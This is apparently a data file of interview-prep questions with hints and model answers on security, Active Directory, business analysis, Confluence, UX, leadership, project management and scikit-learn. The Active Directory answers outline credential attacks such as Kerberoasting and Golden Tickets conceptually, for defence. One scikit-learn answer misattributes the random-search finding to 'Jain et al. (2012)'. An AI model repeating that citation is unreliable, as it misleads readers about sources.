      { q:'What is vulnerability assessment and how does it differ from penetration testing?', hint:'VA: identify and catalogue vulnerabilities without exploiting. Automated scanners: Nessus, OpenVAS. CVE database. CVSS scoring. Patch management follow-up. Pentest: exploit vulnerabilities to prove business impact. VA is broader, less deep.', answer:`Vulnerability Assessment systematically scans and catalogues vulnerabilities in systems without attempting to exploit them. It answers "what vulnerabilities exist?" while penetration testing answers "which vulnerabilities can be successfully exploited and what is the business impact?" VA is broader in scope - scanning all systems in a network range - while a pentest is deeper, focusing on a specific scope with manual investigation and chaining. VA tools: Nessus, Qualys, Rapid7 InsightVM, OpenVAS perform authenticated or unauthenticated scans against target systems, comparing running service versions against the CVE (Common Vulnerabilities and Exposures) database. CVSS (Common Vulnerability Scoring System) scores vulnerabilities 0-10 on attack vector, complexity, privileges required, user interaction, and impact. Critical (9-10): immediate patching required. High (7-8.9): patch within 30 days. Medium (4-7): patch in next cycle. Low (<4): monitor. VA output: a report of all detected vulnerabilities with CVE IDs, CVSS scores, affected assets, and remediation guidance. VA is a continuous process (monthly scans), while a pentest is periodic (annually or after major changes). Many organisations use both: VA for broad continuous coverage, penetration testing for deep investigation of high-risk applications.` },
      { q:'How does incident response work? Describe the IR lifecycle.', hint:'NIST framework: Prepare, Detect and Analyse, Contain, Eradicate, Recover, Post-Incident. SIEM alerts. Playbooks. Evidence preservation. Chain of custody. Root cause analysis. CSIRT team.', answer:`Incident Response is the structured process for handling security breaches. NIST IR Framework phases: Preparation builds capabilities before incidents: IR plan, playbooks for common scenarios (ransomware, data breach, insider threat), SIEM alerts, forensic tools ready, CSIRT (Computer Security Incident Response Team) trained. Detection and Analysis identifies and characterises the incident: SIEM alert fires, SOC analyst investigates, determines scope (which systems, how many accounts, what data), establishes timeline, classifies severity. Containment prevents further damage: isolate compromised systems (network quarantine, disable accounts), block C2 communication at the firewall, take forensic images before changes are made (evidence preservation). Eradication removes the threat: delete malware, close exploited vulnerabilities, reset compromised credentials, rebuild systems from clean images if necessary. Recovery restores normal operations: restore from clean backups, verify integrity, monitor for re-infection, phased return to production. Post-Incident Activity (lessons learned): root cause analysis, timeline reconstruction, process improvements, update detection rules to catch similar incidents earlier. Chain of custody: document every action taken on evidence to maintain admissibility in legal proceedings. A well-defined playbook reduces response time - the ransomware playbook specifies exactly who to notify and what steps to take in the first hour.` },
    ],
    'active directory': [
      { q:'What is Active Directory and how does it work?', hint:'AD: Microsoft directory service. Domain: administrative boundary. Forest: multiple domains. DC: stores directory. LDAP: query protocol. Kerberos: authentication. GPO: group policy. OU: organisational unit. Trust relationships.', answer:`Active Directory (AD) is Microsoft identity and access management system for Windows environments - the backbone of enterprise IT. A Domain is the fundamental administrative unit, holding users, computers, and policies. Domain Controllers (DCs) store the AD database (NTDS.dit) and handle authentication. An Organisational Unit (OU) is a container within a domain for organising objects and applying Group Policy. A Forest is the trust boundary - multiple domains in a forest share a schema and global catalogue and trust each other automatically. Domain trusts extend authentication across different forests or domains. LDAP (Lightweight Directory Access Protocol) is the query protocol - applications query AD for user information, group membership, and computer attributes. Kerberos is the primary authentication protocol: the user authenticates to the DC and receives a Ticket Granting Ticket (TGT); when accessing a service, they present the TGT to get a Service Ticket. NTLM is the fallback for older clients. Group Policy Objects (GPOs) apply configuration to users and computers across the domain - software deployment, security settings, login scripts. GPOs link to domains, OUs, or sites and apply hierarchically.` },
      { q:'How does Kerberos authentication work in Active Directory?', hint:'KDC: Key Distribution Center (DC). TGT: Ticket Granting Ticket. Service Ticket. AS_REQ, AS_REP, TGS_REQ, TGS_REP, AP_REQ. Pass-the-ticket attack. Silver ticket vs golden ticket. SPN for services.', answer:`Kerberos authentication in AD uses a trusted third party (the KDC, running on the Domain Controller) to issue tickets proving identity. Step 1 (AS Exchange): the client sends AS_REQ to the KDC Authentication Service with its username. The KDC verifies the user and responds with AS_REP containing a Ticket Granting Ticket (TGT), encrypted with the KDC secret key (krbtgt hash). The client cannot decrypt the TGT - it just presents it. Step 2 (TGS Exchange): when the client wants to access a service (file server, SQL server), it sends TGS_REQ to the KDC Ticket Granting Service, presenting the TGT. The KDC issues a Service Ticket (ST), encrypted with the service account's secret key. Step 3 (AP Exchange): the client presents the ST to the service. The service decrypts it with its own key to verify the client identity. Service Principal Names (SPNs) link services to their account (MSSQLSvc/server.domain.com:1433 maps to the SQL service account). Attack vectors: Pass-the-Ticket uses a stolen valid ticket for lateral movement. Silver Ticket forges a service ticket using a compromised service account hash - doesn't need the DC. Golden Ticket forges a TGT using the krbtgt hash - full domain persistence.` },
      { q:'How do you secure Active Directory? What are common attack vectors?', hint:'Tiered admin model. Protected Users group. Credential Guard. LAPS for local admin passwords. Disable NTLM where possible. Monitor LDAP queries. Privileged Access Workstations (PAW). DCSync attack. Kerberoasting.', answer:`AD is the primary target in enterprise breaches - controlling AD means controlling the entire environment. Common attack vectors: Kerberoasting: request service tickets for accounts with SPNs, then crack the ticket offline (the ticket is encrypted with the service account password). Mitigation: use gMSA (Group Managed Service Accounts) with 120-character auto-rotating passwords. DCSync: mimics DC replication to extract all password hashes from the domain. Requires domain replication privileges - granted to Domain Admins and by default to some service accounts. Mitigation: restrict DC replication permissions, monitor for unexpected replication. Pass-the-Hash/Pass-the-Ticket: use credential material without cracking. Mitigation: Microsoft Credential Guard uses virtualisation to protect LSASS memory. AS-REP Roasting: request Kerberos pre-auth for accounts with "do not require Kerberos pre-authentication" set. Hardening: Tiered Admin Model separates accounts by privilege tier (Tier 0: DCs, Tier 1: servers, Tier 2: workstations) - Tier 0 admins never log into Tier 1 systems. LAPS (Local Administrator Password Solution) randomises and rotates local administrator passwords per machine. Protected Users security group disables NTLM, limits ticket lifetime, and prevents credential caching. Monitor for AD attacks: Defender for Identity detects Kerberoasting, DCSync, and credential replay in real time.` },
    ],
    'business analysis': [
      { q:'What does a Business Analyst do and what are the core responsibilities?', hint:'Bridge between business and IT. Requirements gathering, documentation, analysis. Stakeholder management. Process mapping. Gap analysis. User stories. Acceptance criteria. BABOK framework.', answer:`A Business Analyst bridges business needs and technology solutions. Core responsibilities: Requirements Elicitation - gathering and understanding what stakeholders need through interviews, workshops, surveys, and observation. Requirements Analysis - analysing, prioritising, and refining requirements to resolve conflicts and ambiguities. Documentation - producing BRDs (Business Requirements Documents), FRDs (Functional Requirements Documents), use cases, user stories, and process flows. Stakeholder Management - identifying, engaging, and managing expectations of all parties affected by the project. Gap Analysis - comparing the current state ("as-is") with the desired future state ("to-be") to identify what needs to change. Process Mapping - documenting business processes using BPMN (Business Process Model and Notation) or flowcharts. In Agile environments, BAs write user stories and acceptance criteria, serve as the Product Owner proxy, and participate in sprint ceremonies. The BABOK (Business Analysis Body of Knowledge) defines the knowledge areas: business analysis planning, elicitation and collaboration, requirements lifecycle management, strategy analysis, requirements analysis and design definition, and solution evaluation.` },
      { q:'How do you gather and document requirements?', hint:'Elicitation techniques: interviews, workshops, surveys, observation (job shadowing), document analysis. Functional vs non-functional requirements. Use cases. User stories: As a [role] I want [goal] so that [reason]. MoSCoW prioritisation.', answer:`Requirements gathering uses multiple techniques depending on the context. Interviews are the most effective - structured one-on-ones with key stakeholders, using open-ended questions to understand goals and pain points, then closed questions to confirm specifics. JAD (Joint Application Development) workshops bring multiple stakeholders together to reach consensus efficiently. Surveys and questionnaires gather input from large audiences. Observation (job shadowing) reveals undocumented processes - what users actually do often differs from what they say they do. Document analysis reviews existing systems, reports, and SOPs to understand current state. Requirements types: Functional (what the system does - "the system shall allow users to reset their password via email") vs Non-Functional (how the system performs - performance: <2 second response time; security: all data encrypted at rest). Use Cases describe actor-system interactions with main flow, alternate flows, and exception flows. User Stories (Agile): "As a customer service agent, I want to view order history by customer ID so that I can resolve queries without asking the customer to repeat information." Acceptance Criteria: "Given the agent is logged in, When they search by customer ID, Then all orders from the last 24 months are displayed." MoSCoW prioritisation: Must Have (release blocker), Should Have (important but not critical), Could Have (nice-to-have), Won't Have (explicitly out of scope).` },
      { q:'How do you create process maps and conduct gap analysis?', hint:'As-Is: current state process map. To-Be: future state. Gap: differences. BPMN notation: tasks, gateways (decisions), events, pools/lanes. Swim lane diagrams. Tools: Visio, Lucidchart, draw.io. Value stream mapping.', answer:`Process mapping documents business processes visually to identify inefficiencies, bottlenecks, and improvement opportunities. As-Is process map captures the current state exactly as it operates - interview process participants and observe actual execution, not just the documented policy (they often differ). Tools: Lucidchart, draw.io, Visio, Miro for collaborative mapping. BPMN (Business Process Model and Notation) is the standard notation: Tasks (rounded rectangles) represent work activities, Gateways (diamonds) represent decisions or parallel splits, Events (circles) represent start/end/intermediate triggers, Pools represent organisations, Lanes represent roles within an organisation. Swim lane diagrams show which role performs each step - crucial for identifying handoffs (where delays and errors often occur). Gap Analysis: compare As-Is to the To-Be (desired future state) and document the gaps: missing capabilities, inefficient steps, manual work that should be automated, bottlenecks. Value Stream Mapping adds time and resource consumption to the process map - distinguishing value-added from non-value-added steps. Each gap becomes a requirement or initiative. Prioritise gaps by business impact and implementation effort - quick wins (high impact, low effort) go first.` },
    ],
    confluence: [
      { q:'What is Confluence and how do you structure a team wiki effectively?', hint:'Confluence: team collaboration and documentation. Spaces: team or project spaces. Pages hierarchy: parent-child. Templates. Labels for discoverability. Macros: table of contents, JIRA issues, code block. Permissions.', answer:`Confluence is Atlassian team wiki and documentation platform - the central knowledge base for engineering, product, and business teams. Effective structure starts at the Space level: create separate spaces for each team (Engineering, Product, QA), major project, or knowledge domain rather than one monolithic space. Within a space, organise pages in a hierarchy: a parent page "Architecture Decisions" contains child pages for each ADR (Architecture Decision Record). Page templates standardise common document types: meeting notes templates capture agenda, attendees, decisions, and action items consistently. Labels add cross-space discoverability: label pages "runbook", "decision", "onboarding" so they are findable from any space. Useful macros: Table of Contents macro auto-generates navigation for long pages, JIRA Issues macro embeds live ticket lists filtered by query, Code Block macro with syntax highlighting for technical documentation, Page Properties and Page Properties Report create structured data summaries (decision log, team roster) from page metadata. Permissions: space-level permissions control read/write access per group; page restrictions override space permissions for sensitive content. The most common failure is creating pages that become stale - I link Confluence documentation to the code it describes and review documentation in retrospectives.` },
      { q:'How do you use Confluence for engineering documentation?', hint:'Architecture Decision Records (ADRs). Runbooks for operations. API documentation. Onboarding guides. Post-mortem templates. Sprint ceremonies notes. JIRA integration. Versioning pages.', answer:`Engineering documentation in Confluence follows consistent templates for different document types. Architecture Decision Records: each significant technical decision gets an ADR page documenting context, options considered, decision made, and consequences - archived for future team members who wonder "why is it done this way?" Runbooks: step-by-step operational procedures for common scenarios (deploy a hotfix, rotate credentials, respond to a database failover alert) - written at 2 AM clarity level, tested by someone other than the author. API Documentation: endpoints, request/response formats, authentication, and examples - for internal APIs, embedding a Swagger/OpenAPI spec as a Confluence attachment or using the Smart Links macro to link to a live Swagger UI. Onboarding Guides: new team member journey covering environment setup, codebase overview, deployment process, and key contacts - maintained by the team and updated when new hires report confusing steps. Post-mortems: blameless incident retrospective documenting timeline, root cause, customer impact, and follow-up action items - linked to the JIRA incidents that were raised. JIRA integration: JIRA Issues macro embeds live sprint board status in Confluence, connecting planning documentation to execution. Page versioning tracks edits - Confluence stores full edit history, enabling comparison of any two versions.` },
    ],
    'ui/ux': [
      { q:'What is the difference between UI and UX design? What does each role involve?', hint:'UX: user experience, research, information architecture, wireframes, usability. UI: visual design, components, interactions, branding, accessibility. UX defines what; UI defines how it looks.', answer:`UX (User Experience) Design focuses on the overall experience of using a product - is it useful, usable, and desirable? UX designers research user needs (interviews, surveys, usability tests), define information architecture (how content is organised), create wireframes and prototypes (low-fidelity representations of structure and flow), and validate designs through testing before implementation. UX asks: what problem are we solving? What does the user need? What is the optimal flow? UI (User Interface) Design focuses on the visual presentation - colour, typography, spacing, iconography, interaction animations, and component design. UI designers take UX wireframes and add visual design: brand consistency, visual hierarchy, accessibility compliance (colour contrast, text sizing), and micro-interactions (button hover states, loading indicators). In practice, roles overlap significantly - many "UX/UI designers" do both. Larger organisations separate them: UX researchers focus on discovery and validation, interaction designers define flows, and visual designers produce the final assets. Both roles must collaborate with developers to ensure feasibility and participate in user testing to validate that designs solve the stated problem.` },
      { q:'How do you conduct user research? Describe key methods.', hint:'Qualitative: interviews, usability testing, contextual inquiry. Quantitative: surveys, analytics. Jobs-to-be-done. Persona creation. User journey mapping. Affinity diagramming. Research synthesis.', answer:`User research uncovers user needs, behaviours, and pain points to inform design decisions. Qualitative methods provide rich understanding but small samples. User Interviews are 30-60 minute structured conversations exploring how users currently complete a task, what frustrates them, and what they are trying to achieve - ask about behaviour, not opinions: "Tell me about the last time you filed an expense report" yields more than "What features would you like?" Contextual Inquiry observes users in their natural environment (workplace, home) performing real tasks - reveals workarounds and undocumented behaviour that interviews miss. Usability Testing gives users a task ("Book a flight from Mumbai to Delhi for next Friday") and observes where they succeed, struggle, and give up. Think-aloud protocol captures reasoning. Five participants reveal 85% of usability problems (Nielsen). Quantitative methods reveal what at scale. Surveys gather opinions from hundreds of users but lack depth - best for validating qualitative findings. Analytics (Google Analytics, Mixpanel) reveal actual behaviour: which pages are abandoned, where users drop off in funnels, which features are unused. Jobs-To-Be-Done framework focuses on the job the user is hiring the product for: "When I am travelling for work, I want to submit expenses without waiting until I am back at my desk, so I do not lose receipts." Research synthesis: use affinity diagramming (cluster related findings) to identify patterns, then create personas and user journey maps to communicate findings to the team.` },
      { q:'How do you design for accessibility (WCAG)?', hint:'WCAG 2.1: 4 principles (POUR). Level A, AA, AAA. Colour contrast: 4.5:1 for normal text. Keyboard navigation. Screen readers: semantic HTML. Alt text. Focus indicators. ARIA labels.', answer:`WCAG (Web Content Accessibility Guidelines) 2.1 organises accessibility into four principles: Perceivable (information must be presentable to all users), Operable (interface must be navigable by keyboard and other inputs), Understandable (content and operation must be comprehensible), Robust (content must be interpreted by assistive technologies). Conformance levels: A (minimum - critical barriers removed), AA (standard requirement in most legal contexts - the practical target), AAA (enhanced - aspirational). Key AA requirements: Colour Contrast Ratio minimum 4.5:1 for normal text, 3:1 for large text (18pt or 14pt bold) - test with WebAIM Contrast Checker or browser devtools. Keyboard Navigation: all functionality accessible via keyboard without a mouse - test by unplugging the mouse and navigating. Focus Indicators must be clearly visible - never remove outline: none without a superior custom focus indicator. Screen Readers interpret semantic HTML: use heading hierarchy (h1 > h2 > h3), nav, main, article, button (not div role=button). Alt Text: descriptive alt text for images conveying information (alt="Bar chart showing 40% increase in Q3 revenue"), empty alt="" for decorative images. ARIA (Accessible Rich Internet Applications) fills gaps for dynamic content: aria-label, aria-expanded, aria-live for announcements. Test with screen readers (NVDA + Firefox on Windows, VoiceOver on Mac, TalkBack on Android).` },
    ],
    leadership: [
      { q:'How do you demonstrate technical leadership without formal authority?', hint:'Lead by example: code quality, documentation. Mentoring juniors. Driving technical decisions with data. Building consensus. Identifying technical debt. RFC process. Creating psychological safety.', answer:`Technical leadership without a manager title is about influence through expertise and communication, not authority. Leading by example means your code demonstrates the quality you expect from others - well-tested, clearly named, with thoughtful commits. When you advocate for refactoring or testing, your own code must evidence those values or your advocacy rings hollow. Driving technical decisions: propose RFCs (Request for Comments) for significant decisions - write up the problem, options considered, trade-offs, and your recommendation. This invites input from the team and documents the reasoning for future engineers. Building consensus across disagreement: understand other perspectives genuinely before countering them; identify the shared goal; find solutions that address multiple concerns. Mentoring: proactively help junior engineers when they are stuck without making them dependent on you - ask questions that guide them to the answer rather than providing it. Identifying and communicating technical debt: quantify it ("this architecture adds 2-3 days to every payment feature") rather than describing it abstractly ("the code is bad"). Creating psychological safety means celebrating honest estimates, accepting that estimates are wrong, and treating bugs as learning opportunities not personal failures - people take more technical risks and speak up earlier about problems.` },
      { q:'How do you manage conflict and difficult conversations in a team?', hint:'Separate person from problem. Use facts, not interpretations. Non-violent communication: observations/feelings/needs/requests. Seek to understand before being understood. Private first. Document agreements. Escalate when stuck.', answer:`Conflict is inevitable in teams - how it is handled determines whether it damages or strengthens trust. Framework for difficult conversations: Prepare by separating the objective facts from your interpretation of them. "The pull request has been open for 5 days without a review" is a fact. "You do not care about code quality" is an interpretation that will trigger defensiveness. Have the conversation privately first - calling out behaviour publicly embarrasses people and prevents honest dialogue. Non-violent communication: State the Observation (what you observed), the Feeling (how it affected you or the team), the Need (what the team requires), and the Request (a specific action). "When PRs wait more than 48 hours for review, it blocks the sprint. We need a way to ensure reviews happen. Can we add a daily check of unreviewed PRs to standups?" rather than "You never review my PRs." Seek to understand before responding - ask "what was going on for you when..." before explaining your perspective. You may learn context that changes your view entirely. Document agreements reached in conversations so there is no ambiguity ("we agreed to address PRs within 24 hours during business hours"). If bilateral conversations fail to resolve a conflict, involve the team lead or manager - not as escalation but as mediation.` },
      { q:'How do you mentor junior developers effectively?', hint:'Ask questions, do not give answers. Stretch assignments. Code review as teaching. Pair programming. Set clear expectations. Celebrate progress. Protect from overload. Career conversations.', answer:`Effective mentorship builds the junior developer capability and confidence over time, not just solves their immediate problem. The core principle: help them find the answer rather than giving it. "What have you tried? What does the error message say? Where in the code do you think the issue is?" builds debugging skills; "the problem is on line 47" does not. Code review as teaching: when you spot a problem, ask "what do you think about the performance of this loop on large datasets?" rather than just writing "use a hash map instead." This prompts them to identify the issue and reason about the solution. Stretch assignments: give tasks slightly beyond their current comfort zone with support - not impossible, not trivially easy. Debriefing after a challenging task ("what would you do differently next time?") internalises the learning. Pair programming accelerates learning through observation of expert reasoning - they see how you approach debugging, how you search for solutions, and how you communicate uncertainty. Set explicit expectations: "For this task, I expect you to research the approach and come to me with a proposal, not a question" builds autonomy. Protect juniors from being buried in urgent but low-learning work - they need space for growth work. Career conversations: ask about their goals and help them identify concrete steps to reach them.` },
    ],
    communication: [
      { q:'How do you communicate technical concepts to non-technical stakeholders?', hint:'Know your audience. Avoid jargon. Use analogies. Focus on business impact, not implementation. Visuals over text. Check understanding. Lead with conclusion. Structured: problem, options, recommendation.', answer:`Communicating technical concepts to non-technical audiences requires translating your knowledge into their mental model. Know your audience first - a CFO cares about cost and risk; a product manager cares about timelines and user impact; a CEO cares about competitive advantage and strategic risk. Never assume shared context: avoid acronyms and technical jargon without definition, then check - "Does that make sense so far?" Analogies bridge the gap: "A database index is like the index at the back of a book - without it, you read every page to find what you want; with it, you jump directly to the right page." Lead with the business outcome, not the technical mechanism: "This refactoring reduces time-to-market for new features from 3 weeks to 1 week" is more compelling to a business audience than "we are decomposing the monolith into microservices." Structure matters: Problem (why this matters now), Options (2-3 realistic choices with trade-offs), Recommendation (your advised path with reasoning). Avoid burying the recommendation at the end - give it upfront, then support it. Visuals: architecture diagrams, flow charts, and graphs communicate complex systems in seconds; a wall of text loses most audiences. After the conversation, send a written summary so stakeholders have a reference and you have a record.` },
      { q:'How do you write effective technical documentation?', hint:'Audience first. Docs types: tutorial (learning), how-to guide (task), explanation (understanding), reference (lookup). Concrete examples. Keep current. Docs-as-code. README as entry point.', answer:`Effective technical documentation starts by identifying the reader and their goal. The Divio documentation system identifies four types with different goals: Tutorials are learning-oriented - a step-by-step guide that gets a beginner to a working result ("Build your first REST API in 30 minutes"). How-to Guides are problem-oriented - steps to achieve a specific goal for someone who knows the basics ("How to add OAuth authentication"). Explanations are understanding-oriented - provide context and background ("Why we use event sourcing instead of mutable state"). Reference documentation is information-oriented - accurate, complete, and structured for lookup ("API endpoint reference"). Writing principles: use concrete examples for every concept - abstract explanations without examples leave readers uncertain. Code examples must be complete and runnable - nothing destroys trust like copy-pasting documentation code that does not work. Keep documentation current: stale docs are worse than no docs (they send engineers down wrong paths). Docs-as-code: store documentation in the same repository as the code it describes, review it in PRs, and include "update docs" in the Definition of Done. README as the entry point: every repository needs a README that answers in 5 minutes: what does this do, how do I run it locally, and how do I contribute.` },
    ],
    'project management': [
      { q:'What are the key differences between Waterfall, Agile, and hybrid project management?', hint:'Waterfall: sequential, fixed scope, late feedback. Agile: iterative, flexible scope, continuous feedback. Hybrid: fixed milestones with agile sprints within phases. Choose based on: requirements stability, team size, risk tolerance.', answer:`Project management methodologies determine how work is planned, executed, and controlled. Waterfall follows a sequential lifecycle: Requirements complete before design begins, design before development, development before testing. Deliverables are defined upfront, changes are controlled through formal change requests, and the product is delivered at the end. Best for: stable requirements (construction, manufacturing), regulated environments with documentation requirements, fixed-price contracts where scope change is costly. Weaknesses: user feedback comes late, design flaws discovered in testing are expensive to fix. Agile delivers working software iteratively - value is delivered incrementally throughout the project. Requirements evolve, user feedback informs the next sprint, and the team adapts to changing priorities. Best for: product development where requirements are not fully known, customer-facing software where market feedback is valuable, and cross-functional teams with daily collaboration. Weaknesses: harder to predict cost and timeline upfront, requires engaged product ownership. Hybrid combines both: high-level waterfall milestones (fixed delivery dates for phases) with agile execution within phases (sprints, backlog). Common in large enterprises that need predictability for budgeting but want agile flexibility within bounded phases. SAFe (Scaled Agile Framework) is the dominant enterprise hybrid model.` },
      { q:'How do you create and manage a project plan?', hint:'WBS: Work Breakdown Structure. Critical path. Gantt chart: task dependencies and timeline. Resource allocation. Risk register. RACI matrix. Milestones. Baseline vs actuals. Earned Value Management.', answer:`A project plan provides the roadmap from initiation to delivery. Work Breakdown Structure (WBS) decomposes the project into manageable work packages - a hierarchical decomposition down to task level with clear deliverables. The WBS is the foundation for scheduling and estimation. Critical Path Analysis identifies the longest sequence of dependent tasks that determines the minimum project duration - delay any task on the critical path and the project end date slips. Gantt Chart visualises the schedule with tasks, durations, dependencies (finish-to-start, start-to-start), and resource assignments - created in MS Project, Smartsheet, or JIRA Plans. Resource allocation: ensure each team member is not over-allocated across concurrent tasks. Risk Register documents identified risks: description, likelihood (1-5), impact (1-5), risk score, mitigation strategy, and owner. RACI Matrix defines who is Responsible (does the work), Accountable (signs off), Consulted (provides input), and Informed (notified of progress) for each deliverable - prevents ambiguity about ownership. Baseline: once approved, baseline the plan - track actuals against the baseline to measure variance. Earned Value Management: Planned Value vs Earned Value vs Actual Cost reveals whether the project is ahead/behind schedule and under/over budget in one metric.` },
      { q:'How do you manage project risks and issues?', hint:'Risk: potential future problem. Issue: current problem. Risk register: identify, assess, respond, monitor. Response strategies: avoid, mitigate, transfer, accept. Issue log: owner, priority, resolution date. Escalation path.', answer:`Risk and issue management are distinct disciplines. A Risk is an uncertain future event with potential negative impact - it may or may not occur. An Issue is a risk that has materialised or a current problem requiring resolution. Risk Management lifecycle: Identify risks through team brainstorming, lessons learned from past projects, and expert judgement. Assess each risk: Likelihood (1-5) Ã— Impact (1-5) = Risk Score - prioritise high-scoring risks. Response strategies: Avoid (change the plan to eliminate the risk - choose a different technology with fewer unknowns), Mitigate (reduce the likelihood or impact - add a proof of concept sprint to validate the technology early), Transfer (assign the risk to a third party - insurance, fixed-price contract with a vendor), Accept (acknowledge the risk and proceed - for low-priority risks with no cost-effective mitigation). Monitor risks throughout the project - conditions change and a low-probability risk may increase. Issue Management: maintain an issue log with description, owner, priority, target resolution date, and status. Issues need owners - unassigned issues do not get resolved. Escalation path: define upfront when an issue should be escalated to the sponsor or steering committee. A clear escalation protocol prevents the PM from absorbing all problems while stakeholders are unaware of threats to delivery.` },
    ],
    scikit: [
      { q:"How does scikit-learn's Pipeline and ColumnTransformer work together?", hint:"Pipeline chains estimators: each step transforms output fed to next. ColumnTransformer applies different transformers to column subsets simultaneously. Combined: prevent data leakage, enable clean cross-validation, single fit/predict call.", answer:`scikit-learn's Pipeline chains preprocessing steps and a final estimator into a single object. Each intermediate step must implement fit_transform; the final step only needs fit and predict. The key benefit is data-leakage prevention: when you call cross_val_score on a Pipeline, fit_transform is called only on the training fold, so statistics like mean/std or vocabulary learned from StandardScaler or TfidfVectorizer never see the validation fold. ColumnTransformer applies different transformers to different column subsets simultaneously - for example StandardScaler to numeric columns and OneHotEncoder to categorical columns - and concatenates the results. Together they handle mixed-type dataframes cleanly. A production pattern: pipe = Pipeline([('pre', ColumnTransformer([('num', StandardScaler(), num_cols), ('cat', OneHotEncoder(handle_unknown='ignore'), cat_cols)])), ('model', RandomForestClassifier())]). This single object can be pickled, versioned, and deployed, ensuring training and inference apply identical transformations.` },
      { q:"Explain the bias-variance tradeoff and which scikit-learn tools help you manage it.", hint:"High bias: underfitting (simple model). High variance: overfitting (complex model). Tools: learning curves, validation curves, cross_val_score, regularisation hyperparameters.", answer:`The bias-variance tradeoff describes how model error decomposes into three parts: bias (error from wrong assumptions - underfitting), variance (error from sensitivity to training data fluctuations - overfitting), and irreducible noise. A linear model on a non-linear problem has high bias; a deep decision tree memorising training data has high variance. scikit-learn tools for diagnosis: learning_curve plots training and CV score vs training set size - high bias shows both scores low and converging, high variance shows a large gap between training (high) and CV (low) scores. validation_curve plots train/CV score vs a hyperparameter (e.g., max_depth) revealing where the sweet spot lies. cross_val_score with k-fold gives an unbiased estimate of generalisation error. Management: regularisation hyperparameters (alpha in Ridge/Lasso, C in SVM, max_depth/min_samples_leaf in trees) are the primary levers. RandomizedSearchCV or GridSearchCV finds the optimal values. Ensemble methods like BaggingClassifier reduce variance; boosting reduces bias iteratively.` },
      { q:"How do you perform feature selection in scikit-learn?", hint:"Filter: SelectKBest, VarianceThreshold. Wrapper: RFE, RFECV. Embedded: L1 regularisation, tree feature_importances_. Permutation importance for model-agnostic ranking.", answer:`Feature selection reduces dimensionality, removes noise, and improves generalisation. scikit-learn supports three categories. Filter methods apply a statistical test independently of any model: VarianceThreshold removes near-constant features; SelectKBest ranks features by a score function (f_classif for ANOVA F-test, mutual_info_classif for mutual information) and keeps the top k. Fast but ignores feature interactions. Wrapper methods use a model's performance to evaluate subsets: RFE (Recursive Feature Elimination) trains the model, removes the weakest feature by coef_ or feature_importances_, and repeats. RFECV adds cross-validation to select the optimal number of features automatically. Embedded methods learn feature importance as part of training: L1 regularisation (Lasso, LinearSVC with L1) drives irrelevant feature coefficients to zero - SelectFromModel(Lasso(alpha=0.01)).fit_transform(X, y). Tree-based models expose feature_importances_ (mean decrease in impurity) but these can be biased toward high-cardinality features. Permutation importance (permutation_importance) is model-agnostic and measures the drop in score when each feature is randomly shuffled - more reliable for interpretation.` },
      { q:"Compare GridSearchCV, RandomizedSearchCV, and Bayesian hyperparameter optimisation.", hint:"GridSearchCV: exhaustive, exponential cost. RandomizedSearchCV: samples budget n_iter, better for large spaces. Bayesian (Optuna/scikit-optimize): builds surrogate model of objective, exploits promising regions.", answer:`GridSearchCV performs an exhaustive search over all combinations in a parameter grid. With 5 hyperparameters each with 4 values and 5-fold CV, that is 4^5 Ã— 5 = 5120 model fits - feasible for small grids but exponential cost makes it impractical for large spaces. RandomizedSearchCV samples n_iter combinations from distributions (scipy.stats distributions or lists) rather than exhaustively trying all. Jain et al. (2012) showed that random search finds nearly-optimal configurations faster than grid search because most hyperparameter spaces have low effective dimensionality - a few parameters matter, and random search allocates more budget exploring them. For n_iter fixed, cost is linear. Bayesian optimisation (Optuna, scikit-optimize's BayesSearchCV, HyperOpt) builds a probabilistic surrogate model (Gaussian Process or TPE) of the objective function, balancing exploration of unknown regions and exploitation of promising ones. Each trial updates the surrogate, directing future trials toward configurations likely to improve the score. Significantly more sample-efficient than random search for expensive models. Practical guidance: use GridSearchCV for 1-2 hyperparameters with small ranges, RandomizedSearchCV for 3-6 hyperparameters, and Bayesian for expensive models (neural networks, gradient boosting with large data).` },
      { q:"Explain scikit-learn's cross-validation strategies and when to use each.", hint:"KFold, StratifiedKFold (classification), TimeSeriesSplit (temporal data), GroupKFold (grouped data leakage prevention), LeaveOneOut (tiny datasets).", answer:`Cross-validation estimates generalisation error by training and evaluating on multiple splits. KFold splits data into k consecutive folds, using each once as the validation set. Default for regression. StratifiedKFold preserves class proportions in each fold - essential for imbalanced classification (a fold with no positive samples gives meaningless AUC). Always use StratifiedKFold for classification. TimeSeriesSplit maintains temporal order: each split uses only past data for training and future data for validation, preventing look-ahead bias - critical for time series forecasting. GroupKFold ensures all samples from a group (e.g., patient ID, user ID) appear in only train or validation, not both - prevents data leakage when samples within a group are correlated. Without this, a model trained on some samples from a patient and evaluated on others from the same patient appears to generalise but actually memorises. LeaveOneOut (LOO): each sample is the validation set once. Unbiased but high variance and computationally expensive - use only for tiny datasets (< 50 samples). RepeatedStratifiedKFold repeats stratified k-fold multiple times with different random seeds, giving a more stable estimate of variance in model performance.` },
      { q:"How do you handle class imbalance in scikit-learn classification tasks?", hint:"Resampling: RandomOverSampler, SMOTE (imbalanced-learn). Algorithm-level: class_weight='balanced'. Threshold tuning. Metrics: precision-recall AUC, F1, not accuracy.", answer:`Class imbalance (e.g., 99% negative, 1% positive) causes models to predict the majority class always and still achieve high accuracy - a useless result. First, choose the right metric: accuracy is misleading; use precision-recall AUC (average_precision_score), F1-score, or Matthews Correlation Coefficient. Algorithm-level approach: most scikit-learn classifiers accept class_weight='balanced', which sets weights inversely proportional to class frequencies - higher loss penalty for misclassifying the minority class. Zero additional preprocessing required. Resampling with imbalanced-learn (integrates with scikit-learn pipelines): RandomOverSampler duplicates minority samples; SMOTE (Synthetic Minority Oversampling Technique) generates synthetic minority samples by interpolating between existing ones; RandomUnderSampler removes majority samples. SMOTE inside a Pipeline with SMOTE only applied to training folds prevents leakage. Threshold tuning: instead of the default 0.5 decision threshold, adjust using precision_recall_curve to find the threshold maximising F1 or satisfying a business constraint (e.g., recall > 0.9 for fraud detection). Ensemble methods like BalancedRandomForestClassifier and EasyEnsembleClassifier from imbalanced-learn combine resampling with bagging for strong performance on skewed datasets.` },
